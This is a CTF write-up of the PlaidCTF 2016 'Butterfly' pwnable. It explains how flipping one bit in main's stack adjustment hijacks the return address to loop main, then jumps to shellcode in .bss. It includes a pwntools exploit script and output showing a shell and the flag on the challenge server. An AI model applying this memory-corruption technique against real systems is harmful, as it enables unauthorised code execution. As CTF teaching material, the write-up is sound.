---
layout: post
title: Plaidctf 2016 Butterfly
comments: false
category: ctf
tags: ctf, plaidctf, reversing, pwnable
---

This is a write-up of the challenge Butterfly from the Plaid ctf 2016.

# The challenge

Butterfly is a 64bit x86 linux pwnable, which simply lets you flip a single bit by shining a cosmic ray at it.

It works by `mprotect`'ing the page with read-write-execute before flipping the bit and then calling mprotect again to remove write rigths.

# The exploit

As we can flip arbitary bits in both the code and data, it knew that we should either flip the bit the code of `main` or in some got entry,
to get control of `rip`.

At the end of `main` we found:
```text
  400860:   48 83 c4 48             add    rsp,0x48
  400864:   5b                      pop    rbx
  400865:   41 5e                   pop    r14
  400867:   41 5f                   pop    r15
  400869:   5d                      pop    rbp
  40086a:   c3                      ret
```
and thus flipping the 6'th bit at 400863 would change the `add rsp,0x48` to `add rsp, 0x8`,
and so `main` would return to an address of our choosing.

So by letting `main` to return to `main` we was able to get unlimited bit flips.

```python
from pwn import *
context(arch="amd64")

e = ELF("./butterfly_33e86bcc2f0a21d57970dc6907867bed")
#r = remote("butterfly.pwning.xxx", 9999)
r = process("./butterfly_33e86bcc2f0a21d57970dc6907867bed")

addr = 0x400860+3
num = (addr << 3) + 6
r.sendline(str(num).ljust(40)+p64(e.symbols["main"]))
```

which when run gives us:

```sh
$ python doit_butterfly.py
[*] '/home/user/butterfly_33e86bcc2f0a21d57970dc6907867bed'
    Arch:          amd64-64-little
    RELRO:         No RELRO
    Stack Canary:  Canary found
    NX:            NX enabled
    PIE:           No PIE
[x] Starting program './butterfly_33e86bcc2f0a21d57970dc6907867bed'
[+] Starting program './butterfly_33e86bcc2f0a21d57970dc6907867bed': Done
[*] Switching to interactive mode
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
WAS IT WORTH IT???
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
```

note that "THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?" is written twice, this is because we are re-executing `main`.

So from here it was easy to write some shellcode in the `.bss` and just return to it...

# Final exploit

{% gist 9ae520bc2bfeca537bd119760f149f0b %}
```sh
[*] '/home/user/butterfly_33e86bcc2f0a21d57970dc6907867bed'
    Arch:          amd64-64-little
    RELRO:         No RELRO
    Stack Canary:  Canary found
    NX:            NX enabled
    PIE:           No PIE
[x] Opening connection to butterfly.pwning.xxx on port 9999
[x] Opening connection to butterfly.pwning.xxx on port 9999: Trying 13.92.239.242
[+] Opening connection to butterfly.pwning.xxx on port 9999: Done
[*] Switching to interactive mode
WAS IT WORTH IT???
THOU ART GOD, WHITHER CASTEST THY COSMIC RAY?
WAS IT WORTH IT???
id
uid=1001(problem) gid=1001(problem) groups=1001(problem)
cat flag
PCTF{b1t_fl1ps_4r3_0P_r1t3}
```


